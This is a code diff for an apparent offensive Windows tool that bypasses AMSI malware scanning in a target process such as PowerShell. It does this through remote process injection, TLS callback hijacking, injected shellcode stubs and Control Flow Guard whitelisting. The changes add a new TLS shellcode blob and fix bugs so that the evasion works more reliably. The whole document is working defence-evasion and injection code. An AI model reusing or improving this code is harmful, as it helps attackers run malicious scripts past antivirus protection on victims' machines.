@@ -28,20 +28,29 @@ UCHAR apc_bin[] = {
 };
 UINT apc_bin_len = 57;
 
-UCHAR TLSCallback_bin[] = {
-  0x83, 0xfa, 0x02, 0x75, 0x01, 0xcc, 0xc3
+unsigned char TLSCallback_bin[] = {
+  0x83, 0xfa, 0x02, 0x75, 0x23, 0x55, 0x48, 0x89, 0xe5, 0x48, 0x83, 0xe4,
+  0xf0, 0x48, 0x83, 0xec, 0x20, 0x48, 0xb8, 0x37, 0x13, 0x37, 0x13, 0x37,
+  0x13, 0x37, 0x13, 0x48, 0x8d, 0x0d, 0x07, 0x00, 0x00, 0x00, 0xff, 0xd0,
+  0x48, 0x89, 0xec, 0x5d, 0xc3, 0x54, 0x4c, 0x53, 0x20, 0x43, 0x41, 0x4c,
+  0x4c, 0x42, 0x41, 0x43, 0x4b, 0x20, 0x48, 0x49, 0x54, 0x00
 };
-UINT TLSCallback_bin_len = 7;
+unsigned int TLSCallback_bin_len = 58;
 
-PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
+PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase, UCHAR* local_tls_bin, SIZE_T local_tls_bin_len) {
     printf("[*] Applying TLS Hijacking AMSI Bypass via VEH handler...\n");
     // The idea is to patch the first TLS callback of the process to point to our APC stub, which in turn will register our VEH handler and call it directly
     // This technique is really stealthy as it doesn't require any APC queuing or thread context manipulation, but it requires the target process to have a TLS directory with at least one callback (which is the case for powershell for example)
 
-    PVOID pRemoteTLSCallback = WrapperVirtualAllocEx(hProcess, NULL, TLSCallback_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    PVOID pRemoteTLSCallback = WrapperVirtualAllocEx(hProcess, NULL, local_tls_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!pRemoteTLSCallback) return FALSE;
-    WrapperWriteProcessMemory(hProcess, pRemoteTLSCallback, TLSCallback_bin, TLSCallback_bin_len, NULL);
-    WrapperVirtualProtectEx(hProcess, pRemoteTLSCallback, TLSCallback_bin_len, PAGE_EXECUTE_READ, NULL);
+    WrapperWriteProcessMemory(hProcess, pRemoteTLSCallback, local_tls_bin, local_tls_bin_len, NULL);
+    
+    DWORD oldTlsProtect;
+    if (!WrapperVirtualProtectEx(hProcess, pRemoteTLSCallback, local_tls_bin_len, PAGE_EXECUTE_READ, &oldTlsProtect)) {
+        printf("[-] Failed to protect TLS callback memory.\n");
+        return FALSE;
+    }
 
     //We Get the remote TLS directory
     IMAGE_DOS_HEADER dosHdr = {0};
@@ -65,32 +74,36 @@ PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
     INT callbackCount = 0;
     PVOID tempPtr = NULL;
     
-    while (TRUE) {
-        // Read the table until we find a NULL entry
-        if (!WrapperReadProcessMemory(
-                hProcess, 
-                (PBYTE)pRemoteCallbacksArray + (callbackCount * sizeof(PVOID)), 
-                &tempPtr, 
-                sizeof(PVOID), 
-                NULL)) 
-        {
-            return FALSE; // Erreur de lecture
+    // Check if the array pointer is valid before iterating
+    if (pRemoteCallbacksArray != NULL) {
+        while (TRUE) {
+            // Read the table until we find a NULL entry
+            if (!WrapperReadProcessMemory(
+                    hProcess, 
+                    (PBYTE)pRemoteCallbacksArray + (callbackCount * sizeof(PVOID)), 
+                    &tempPtr, 
+                    sizeof(PVOID), 
+                    NULL)) 
+            {
+                return FALSE; // Erreur de lecture
+            }
+            
+            if (tempPtr == NULL) break;
+            callbackCount++;
         }
-        
-        if (tempPtr == NULL) break;
-        callbackCount++;
     }
 
     printf("[*] Found %d existing TLS callback(s).\n", callbackCount);
 
     SIZE_T newArraySize = (callbackCount + 2) * sizeof(PVOID); // +1 for our callback, +1 for the new NULL terminator
     PVOID* localNewArray = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, newArraySize);
+    
     //Copy existing Callback Arrays
     if (callbackCount > 0) {
         WrapperReadProcessMemory(hProcess, pRemoteCallbacksArray, localNewArray, callbackCount * sizeof(PVOID), NULL);
     }
     //Add our callback at the end of the array
-    localNewArray[callbackCount] = pRemoteTLSCallback; // Our callback
+    localNewArray[callbackCount] = (PBYTE) pRemoteTLSCallback; // Our callback
     localNewArray[callbackCount + 1] = NULL; // New NULL terminator
 
     PVOID pRemoteNewArray = WrapperVirtualAllocEx(hProcess, NULL, newArraySize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -114,7 +127,8 @@ PVOID ApplyTLSHijacking(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
 
     WrapperWriteProcessMemory(hProcess, pRemoteAddressOfCallBacksField, &pRemoteNewArray, sizeof(PVOID), NULL);
 
-    VirtualProtectEx(hProcess, pRemoteAddressOfCallBacksField, sizeof(PVOID), oldProtectHeader, &oldProtectHeader);
+    // FIX: Maintained wrapper consistency (avoid raw VirtualProtectEx when Wrapper exists)
+    WrapperVirtualProtectEx(hProcess, pRemoteAddressOfCallBacksField, sizeof(PVOID), oldProtectHeader, &oldProtectHeader);
 
     printf("[+] TLS Hijacking successful! Shellcode will execute on ResumeThread.\n");
 
@@ -155,23 +169,26 @@ BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
     HANDLE hHeap = GetProcessHeap();
     UCHAR* local_veh_bin = (UCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, veh_bin_len);
     UCHAR* local_apc_bin = (UCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, apc_bin_len);
+    UCHAR* local_tls_bin = (UCHAR*)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, TLSCallback_bin_len);
 
-    if (!local_veh_bin || !local_apc_bin) {
+    if (!local_veh_bin || !local_apc_bin || !local_tls_bin) {
         if (local_veh_bin) HeapFree(hHeap, 0, local_veh_bin);
         if (local_apc_bin) HeapFree(hHeap, 0, local_apc_bin);
+        if (local_tls_bin) HeapFree(hHeap, 0, local_tls_bin);
         return FALSE;
     }
 
     // CRT-Free memcpy alternative
     for (SIZE_T i = 0; i < veh_bin_len; i++) local_veh_bin[i] = veh_bin[i];
     for (SIZE_T i = 0; i < apc_bin_len; i++) local_apc_bin[i] = apc_bin[i];
-
+    for (SIZE_T i = 0; i < TLSCallback_bin_len; i++) local_tls_bin[i] = TLSCallback_bin[i];
 
     // 2. Patch VEH Stub Placeholder (Using the Heap copy)
     if (!PatchPlaceholder(local_veh_bin, veh_bin_len, 0xAAAAAAAAAAAAAAAA, pAmsiScanBuffer)) {
         printf("[-] Failed to patch AmsiScanBuffer address in VEH stub.\n");
         HeapFree(hHeap, 0, local_veh_bin);
         HeapFree(hHeap, 0, local_apc_bin);
+        HeapFree(hHeap, 0, local_tls_bin);
         return FALSE;
     }
 
@@ -185,9 +202,9 @@ BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
     WrapperVirtualProtectEx(hProcess, pRemoteVeh, veh_bin_len, PAGE_EXECUTE_READ, &oldProtect);
 
     // 4. Patch APC Stub Placeholders (Using the Heap copy)
-    PatchPlaceholder(local_apc_bin, apc_bin_len, 0xBBBBBBBBBBBBBBBB, pLoadLibraryA);
     PatchPlaceholder(local_apc_bin, apc_bin_len, 0xCCCCCCCCCCCCCCCC, pRemoteVeh);
     PatchPlaceholder(local_apc_bin, apc_bin_len, 0xDDDDDDDDDDDDDDDD, pRtlAddVeh);
+    PatchPlaceholder(local_tls_bin, TLSCallback_bin_len, 0x1337133713371337, CustomGetProcAddress(CustomGetModuleHandleW(L"kernel32.dll"), "OutputDebugStringA"));
 
     // 5. Allocate and write APC Stub
     PVOID pRemoteApc = WrapperVirtualAllocEx(hProcess, NULL, apc_bin_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -198,9 +215,10 @@ BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
 
     printf("[+] VEH Handler setup at: 0x%p\n", pRemoteVeh);
     printf("[+] APC Stub setup at: 0x%p\n", pRemoteApc);
+
     printf("[+] Using TLS Callbacks to trigger VEH on thread creation.\n");
 
-    PVOID pRemoteTLSCallbackStub = ApplyTLSHijacking(hProcess, hThread, ImageBase);
+    PVOID pRemoteTLSCallbackStub = ApplyTLSHijacking(hProcess, hThread, ImageBase, local_tls_bin, TLSCallback_bin_len);
 
     // --- CFG WHITELISTING ---
     printf("[*] Whitelisting the APC stub, TLS Callback & VEH for CFG\n");
@@ -212,9 +230,15 @@ BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
         cfgInfo.Offset = 0; 
         cfgInfo.Flags = CFG_CALL_TARGET_VALID; // Mandatory flag
 
-        pSetProcessValidCallTargets(hProcess, pRemoteTLSCallbackStub, TLSCallback_bin_len, 1, &cfgInfo);
-        pSetProcessValidCallTargets(hProcess, pRemoteApc, apc_bin_len, 1, &cfgInfo);
-        pSetProcessValidCallTargets(hProcess, pRemoteVeh, veh_bin_len, 1, &cfgInfo);
+        // CFG RegionSize MUST be aligned to the system page boundary (4096 bytes). 
+        // Passing sizes like 43 or 57 will cause SetProcessValidCallTargets to return ERROR_INVALID_PARAMETER.
+        SIZE_T tlsRegionSize = (TLSCallback_bin_len + 0xFFF) & ~0xFFF;
+        SIZE_T apcRegionSize = (apc_bin_len + 0xFFF) & ~0xFFF;
+        SIZE_T vehRegionSize = (veh_bin_len + 0xFFF) & ~0xFFF;
+
+        pSetProcessValidCallTargets(hProcess, (PBYTE)pRemoteTLSCallbackStub, tlsRegionSize, 1, &cfgInfo);
+        pSetProcessValidCallTargets(hProcess, pRemoteApc, apcRegionSize, 1, &cfgInfo);
+        pSetProcessValidCallTargets(hProcess, pRemoteVeh, vehRegionSize, 1, &cfgInfo);
     }
 
     // 6. Queue the APC to the target thread
@@ -228,11 +252,13 @@ BOOL ApplyVehBypass(HANDLE hProcess, HANDLE hThread, PVOID ImageBase) {
     // Clean execution flow ends here, free memory and return TRUE
     HeapFree(hHeap, 0, local_veh_bin);
     HeapFree(hHeap, 0, local_apc_bin);
+    HeapFree(hHeap, 0, local_tls_bin);
     return TRUE;
 
 cleanup:
     // Error execution flow ends here
-    HeapFree(hHeap, 0, local_veh_bin);
-    HeapFree(hHeap, 0, local_apc_bin);
+    if (local_veh_bin) HeapFree(hHeap, 0, local_veh_bin);
+    if (local_apc_bin) HeapFree(hHeap, 0, local_apc_bin);
+    if (local_tls_bin) HeapFree(hHeap, 0, local_tls_bin); // FIX: Memory leak resolved
     return FALSE;
 }
